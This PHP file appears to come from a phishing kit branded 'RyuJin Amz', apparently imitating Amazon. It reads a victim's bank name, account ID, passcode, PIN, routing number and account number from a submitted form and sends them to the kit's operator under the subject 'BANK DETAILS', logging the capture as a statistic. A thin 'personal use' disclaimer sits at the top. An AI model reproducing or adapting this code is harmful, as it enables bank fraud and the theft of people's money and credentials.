<?php
/**
* ------------------------------------------------------
* FILE GENERATED FROM RYUCLI ( Wed,14-04-2021 00:27 )
* @filename bank.php
* ------------------------------------------------------
*
* @package RyuFramework
* 
* @author shinryu
* @version v1.0-21
* @copyright 2021 shinryujin
*
*
* @disclaimer : 
* This is software for personal use, misuse of this software is not the responsibility of us (the owner). 
* All legal forms are submitted to their respective users 
*
**/
/*** LOG CONFIG FOR STATS ***/
$continue = $this->router('bank')['short'];
$type_log = 'bank';
$desc_log  = 'User fill bank form';
////////////////////////////

/**** SENDING CONFIG ***/
$type_send = 'bank';
$subject_send ='BANK DETAILS ';
$form_send = 'RyuJin Amz';
////////////////////////


if($this->getPost())
{
    $data = [];

    $namebank = $this->getPost()['namebank'];
    $data['namebank'] = $namebank; 

    
    $accid = $this->getPost()['account_id'];
    $data['account_id'] = $accid; 

    
    $passcode = $this->getPost()['passcode'];
    $data['passcode'] = $passcode; 

    
    $pin = $this->getPost()['pin'];
    $data['pin'] = $pin; 

    
    $routing = $this->getPost()['routing_number'];
    $data['routing_number'] = $routing; 

    
    $accnum = $this->getPost()['account_number'];
    $data['account_number'] = $accnum; 

    
        $send = ['from' => $from_send,
                'subject' => $subject_send,
                'type' => $type_send,
                'data' => $data
            ];

        $log = ['type' => $type_log,
                'desc' => $desc_log
            ];

        return $this->send($send,$log,$continue);
 
}
